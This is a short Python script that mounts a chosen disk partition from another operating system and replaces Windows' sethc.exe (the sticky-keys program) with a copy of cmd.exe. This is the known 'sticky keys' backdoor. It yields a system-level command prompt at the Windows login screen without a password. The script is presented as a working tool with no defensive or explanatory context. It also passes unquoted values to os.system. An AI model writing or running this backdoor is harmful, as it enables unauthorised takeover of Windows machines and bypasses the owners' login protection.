import psutil
import os

def list_partitions():
    partitions = psutil.disk_partitions()
    for i, partition in enumerate(partitions):
        print(f"{i + 1}. Device: {partition.device}, Mountpoint: {partition.mountpoint}, File system type: {partition.fstype}")
    return partitions

def mount_partition(partition, mount_point):
    try:
        os.makedirs(mount_point, exist_ok=True)
        os.system(f"sudo mount {partition.device} {mount_point}")
        print(f"Partition {partition.device} mounted at {mount_point}")
    except Exception as e:
        print(f"Failed to mount partition: {e}")

def perform_operations(mount_point):
    try:
        os.chdir(f"{mount_point}/Windows/System32")
        os.system("cp sethc.exe sethc_backup.exe")
        os.system("cp cmd.exe sethc.exe")
        print("Operations completed successfully.")
    except Exception as e:
        print(f"Failed to perform operations: {e}")

if __name__ == "__main__":
    partitions = list_partitions()
    choice = int(input("Enter the number of the partition you want to mount: ")) - 1

    if 0 <= choice < len(partitions):
        mount_point = "/mnt/test"
        mount_partition(partitions[choice], mount_point)
        perform_operations(mount_point)
    else:
        print("Invalid choice")
